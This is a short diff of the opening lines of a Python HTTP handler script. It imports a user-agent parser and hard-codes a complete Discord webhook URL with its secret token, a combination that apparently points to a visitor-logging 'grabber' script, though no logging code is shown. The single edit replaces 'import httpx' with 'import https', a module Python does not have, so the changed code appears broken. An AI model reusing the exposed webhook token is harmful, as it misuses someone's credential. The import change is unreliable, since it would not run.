@@ -1,6 +1,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import httpx, base64, httpagentparser
+import https, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1475048856508043390/SHapmBcgEzccFC6XUSiTQusDOHOJCXMaNgpBBlsSPM-qeQeP1QT3XxL88JLNcXBUEx1u'
 
